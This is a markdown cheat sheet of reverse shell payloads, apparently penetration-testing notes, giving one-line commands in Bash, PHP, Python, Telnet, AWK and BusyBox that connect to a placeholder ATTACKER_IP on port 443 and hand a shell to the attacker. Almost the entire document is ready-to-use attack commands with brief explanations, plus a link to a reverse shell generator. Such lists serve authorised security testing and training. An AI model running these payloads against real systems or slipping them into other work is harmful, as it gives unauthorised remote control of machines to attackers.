# 🌐 Shell Payloads
[Reverse Shell Generator](https://www.revshells.com/)
## 📋 Purpose

**Shell payloads** are commands or scripts that expose a shell for bind or reverse shell connections, enabling remote command execution on a compromised system.

## 🔍 Reverse Shell Payloads (Linux)

### Bash

- **Normal Bash**:
    
    ```bash
    bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
    ```
    
    Redirects interactive shell I/O to a TCP connection.
    
- **Bash Read Line**:
    
    ```bash
    exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
    ```
    
    Uses file descriptor 5 to execute commands from the socket.
    
- **Bash File Descriptor 196**:
    
    ```bash
    0<&196; exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
    ```
    
    Uses file descriptor 196 for shell I/O.
    
- **Bash File Descriptor 5**:
    
    ```bash
    bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
    ```
    
    Similar to normal Bash, using file descriptor 5.
    

### PHP

- **Using `exec`**:
    
    ```bash
    php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
    ```
    
- **Using `shell_exec`**:
    
    ```bash
    php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
    ```
    
- **Using `system`**:
    
    ```bash
    php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
    ```
    
- **Using `passthru`**:
    
    ```bash
    php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
    ```
    
- **Using `popen`**:
    
    ```bash
    php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3","r");'
    ```
    
    Each PHP payload opens a socket and executes a shell with different functions.

### Python

- **Using Environment Variables**:
    
    ```bash
    export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
    ```
    
- **Using `subprocess`**:
    
    ```bash
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
    ```
    
- **Short Python**:
    
    ```bash
    python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'
    ```
    
    Python payloads create socket connections and spawn interactive bash shells.

### Others

- **Telnet**:
    
    ```bash
    TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
    ```
    
    Uses a named pipe and Telnet to connect to the attacker.
    
- **AWK**:
    
    ```bash
    awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
    ```
    
    Uses AWK’s TCP capabilities to execute commands.
    
- **BusyBox**:
    
    ```bash
    busybox nc ATTACKER_IP 443 -e sh
    ```
    
    Uses BusyBox Netcat to execute a shell.
    

## 🛠 Resources

- [Reverse Shell Generator](https://www.revshells.com/)

## ✅ Quick Notes

- **Subprocess Module**: Python module used for managing shell commands and reverse shell connections.
- **PHP Reverse Shell**: Uses `exec`, `shell_exec`, `system`, `passthru`, or `popen` to execute commands via TCP.
- **Python Reverse Shell**: Can use environment variables and socket connections for reverse shells.
- **Payload Types**: Support both bind and reverse shells, varying by OS and tools.